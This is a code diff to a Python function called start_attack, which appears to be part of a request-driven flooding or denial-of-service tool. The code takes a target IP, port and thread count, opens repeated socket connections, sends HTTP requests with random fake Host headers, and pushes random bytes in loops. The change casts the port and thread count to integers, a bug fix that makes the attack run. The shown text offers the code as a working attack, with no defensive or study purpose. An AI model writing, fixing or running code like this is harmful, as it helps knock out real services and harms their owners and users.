@@ -14,7 +14,7 @@ def start_attack():
     target_port = data.get('port', 80)
 
     def attack():
-        s = socket.create_connection((target_ip, target_port))
+        s = socket.create_connection((target_ip, int(target_port)))
         fake_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
         host_header = f"Host: {fake_ip}\r\n"
         payload = f"GET / HTTP/1.1\r\n{host_header}\r\n"
@@ -22,7 +22,7 @@ def start_attack():
         s.send(os.urandom(num_bytes))
         
 
-    for _ in range(data.get('threads', 10)):
+    for _ in range(int(data.get('threads', 10))):
         for _ in range(num_attacks):
             attack()
 
